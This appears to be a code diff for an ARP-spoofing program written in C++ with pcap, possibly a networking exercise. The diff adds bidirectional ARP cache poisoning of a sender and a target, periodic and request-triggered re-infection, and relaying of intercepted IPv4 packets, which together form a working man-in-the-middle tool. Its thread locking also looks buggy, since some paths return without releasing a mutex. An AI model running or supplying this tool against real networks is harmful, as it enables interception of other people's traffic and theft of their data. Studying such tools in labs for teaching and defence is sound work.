@@ -35,11 +35,13 @@ void init_arp(EthArpPacket& packet,Mac dmac, Mac smac_e, Mac smac_a, Ip sip, Mac
 
 void send_arp(pcap_t *handle,EthArpPacket& packet)
 {
+    Pthread_mutex_lock(&mutex1);
     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
+    Pthread_mutex_unlock(&mutex1);
     if (res != 0)
     {
         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
-        exit(-1);
+        pthread_exit(NULL);
     }
 }
 
@@ -47,15 +49,15 @@ const u_char * read_packet(pcap_t* handle)
 {
     struct pcap_pkthdr *header;
     const u_char *packet;
-    Pthread_mutex_lock(&mutex);
+    Pthread_mutex_lock(&mutex1);
     int res = pcap_next_ex(handle, &header, &packet);
-    Pthread_mutex_unlock(&mutex);
     if (res == 0) return NULL;
     if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
     {
         printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
         return NULL;
     }
+    Pthread_mutex_unlock(&mutex1);
     return packet;
 }
 
@@ -64,40 +66,95 @@ void arp_infection(void* arg)
     Spoof_arg sarg = *(Spoof_arg*) arg; //because of call by reference while thread
     Sem_post(&sem);
 
-    EthArpPacket p;
-    init_arp(p,sarg.s_mac, sarg.a_mac, sarg.a_mac ,sarg.t_ip, sarg.s_mac, sarg.s_ip, ArpHdr::Reply);
+    EthArpPacket p1;
+    init_arp(p1,sarg.s_mac, sarg.a_mac, sarg.a_mac ,sarg.t_ip, sarg.s_mac, sarg.s_ip, ArpHdr::Reply);
+    EthArpPacket p2;
+    init_arp(p2,sarg.t_mac, sarg.a_mac, sarg.a_mac ,sarg.s_ip, sarg.t_mac, sarg.t_ip, ArpHdr::Reply);
+
     if(sarg.status == P)
     {
         while(chk_val)
         {
-            //cout << pthread_self() << " : " <<string(sarg.t_ip) << endl;
-            send_arp(sarg.handle,p);
+            puts("arp-infection - p");
+            cout << pthread_self() << " : " <<string(sarg.t_ip) << endl;
+            send_arp(sarg.handle,p1);
+            send_arp(sarg.handle,p2);
             sleep(PERIOD);
         }
     }
     else if(sarg.status == NP)
     {
-        /*
-            1. ARP Request
-            AND
-            2. tip == target ip
-            OR
-            3. sip == sender ip or target ip --> because sender could learn by arp req
-        */
-        struct pcap_pkthdr *header;
         const u_char *packet;
-        ArpHdr arp;
+        EthArpPacket arp;
+        EthIpPacket ip;
+
         while(chk_val)
         {
+            Pthread_mutex_lock(&mutex2);
             packet = read_packet(sarg.handle);
-            if (packet != NULL)
+            if (packet == NULL) continue;
+            memcpy(&arp,packet, sizeof(arp));
+            memcpy(&ip,packet,sizeof(ip));
+            
+          
+            
+            
+            
+            if(arp.eth_.type() == EthHdr::Arp)  //non periodic infection
             {
-                memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
-                if (arp.op_ == htons(ArpHdr::Request) && (arp.tip() == sarg.t_ip || (arp.sip() == sarg.s_ip || arp.sip() == sarg.t_ip)))
+                puts("arp-infection - np");
+                if (arp.arp_.op() == ArpHdr::Request && (arp.arp_.tip() == sarg.t_ip || (arp.arp_.sip() == sarg.s_ip || arp.arp_.sip() == sarg.t_ip)))
                 {
-                    send_arp(sarg.handle,p);
+                    send_arp(sarg.handle,p1);
+                    send_arp(sarg.handle,p2);
                 }
             }
+            
+            else if(arp.eth_.type() == EthHdr::Ip4)  //relay
+            {
+                //puts("relay...");
+                map<Ip,Mac> table = *(sarg.table);
+                Ip sip = ip.ip_.sip();
+                Ip dip = ip.ip_.dip();
+                
+
+                if(table.find(sip) != table.end() || table.find(dip) != table.end())
+                {
+                    cout << "relay request detected!!" << endl;
+                    for(int i = 0; i < 20; i++){
+                        printf("%hhx ", packet[14+i]);
+                    }
+                    
+                    cout << string(sip) << endl << string(dip) << endl;
+                       
+                    ip.eth_.smac_ = sarg.a_mac;
+                    ip.eth_.dmac_ = table[sarg.t_ip];
+                    cout << string(ip.eth_.dmac_) << endl;
+                    uint16_t offset = ETHER_HDR_LEN+IP_HDR_LEN;
+                    uint16_t size = ip.ip_.tlen() - IP_HDR_LEN;
+                    printf("is this right? : %d\n",ip.ip_.tlen());
+                    printf("relay packet size : %d\n",size);
+                    int total_size = size + offset + IP_HDR_LEN;
+                    u_char* r_pkt = (u_char*)calloc(1, total_size);    //to make sure NULL;
+                    memcpy(r_pkt,&ip,sizeof(EthIpPacket));
+                    memcpy(r_pkt+sizeof(EthIpPacket),packet+offset,size);
+                    
+                    for(int i = 0; i < 20; i++){
+                    	printf("%hhx ", r_pkt[i]);
+                    }
+                    
+                    int res = pcap_sendpacket(sarg.handle, (const u_char*)(r_pkt), size + offset + IP_HDR_LEN);
+                    if (res != 0)
+                    {
+                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(sarg.handle));
+                        free(r_pkt);
+                        pthread_exit(NULL);
+                    }
+                    free(r_pkt);
+                }
+                //else puts("nah....");
+            }
+            Pthread_mutex_unlock(&mutex2);
         }
     }
 }
@@ -115,7 +172,7 @@ Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip)
         init_arp(p,broadcast, a_mac, a_mac, a_ip, lookup, t_ip, ArpHdr::Request);
         send_arp(handle, p);
 
-        ArpHdr arp;
+        EthArpPacket arp;
         time_t sT = time(NULL);
         while (true)
         {
@@ -129,12 +186,15 @@ Mac resolve_mac_by_arp(pcap_t *handle, Mac a_mac, Ip a_ip, Ip t_ip)
             packet = read_packet(handle);
             if (packet != NULL)
             {
-                memcpy(&arp, packet + ETHER_HDR_LEN, sizeof(arp));
-                Ip chk_a_ip(a_ip);
-                Mac chk_a_mac(a_mac);
-                Ip chk_t_ip(t_ip);
-                if (arp.op_ == htons(ArpHdr::Reply) && chk_a_ip == arp.tip() && chk_t_ip == arp.sip() && chk_a_mac == arp.tmac())
-                    return arp.smac();
+                memcpy(&arp, packet, sizeof(arp));
+                if(arp.eth_.type() == EthHdr::Arp)
+                {
+                    Ip chk_a_ip(a_ip);
+                    Mac chk_a_mac(a_mac);
+                    Ip chk_t_ip(t_ip);
+                    if (arp.arp_.op() == ArpHdr::Reply && chk_a_ip == arp.arp_.tip() && chk_t_ip == arp.arp_.sip() && chk_a_mac == arp.arp_.tmac())
+                        return arp.arp_.smac();
+                }
             }
         }
     }
@@ -213,11 +273,9 @@ STATUS rt_func(void* arg)
     *(tmp.ans) = ret;
     return OK;
 }
-
 void recover(void* arg)
 {
-    Relay_arg rarg = *((Relay_arg*)arg);
+    Recover_arg rarg = *((Recover_arg*)arg);
     Sem_post(&sem);
-    //cout << pthread_self() << " : " <<string(rarg.p.arp_.tip_) << endl;
-    send_arp(rarg.handle,rarg.p);
+    for(int i=0;i<5;i++) send_arp(rarg.handle,rarg.p);  //to make sure
 }
